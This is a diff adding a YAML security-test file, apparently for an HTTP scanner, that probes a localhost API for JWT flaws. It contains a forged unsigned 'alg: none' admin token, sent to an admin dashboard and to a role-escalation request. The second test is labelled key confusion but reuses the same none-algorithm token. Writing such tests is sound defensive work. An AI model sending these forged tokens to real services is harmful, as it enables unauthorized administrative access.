@@ -1,0 +1,41 @@
+name: "Manipulation JWT - Algorithm 'None' & Key Confusion"
+variables:
+  base_url: "http://localhost:8080"
+  # Payload JWT : {"alg":"none","typ":"JWT"}.{"sub":"admin","iat":1516239022}. (non signé)
+  jwt_none: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+defaults:
+  read_timeout: 10
+  verify: false
+  follow_redirects: false
+
+tests:
+  - id: jwt-none-algo
+    name: "JWT Algorithm None - Bypass d'authentification"
+    severity: critical
+    request:
+      method: GET
+      path: "/api/admin/dashboard"
+      headers:
+        Authorization: "Bearer {{jwt_none}}"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(admin|dashboard|welcome)"
+      - header_not_matches:
+          name: "Content-Type"
+          regex: "(?i)text/html"
+
+  - id: jwt-rsa-to-hmac
+    name: "JWT RSA à HMAC (Key Confusion) - Sonde"
+    severity: high
+    request:
+      method: POST
+      path: "/api/user/profile"
+      headers:
+        Content-Type: "application/json"
+        Authorization: "Bearer {{jwt_none}}"
+      json:
+        action: "update_role"
+        role: "admin"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(role.*updated|success.*admin)"
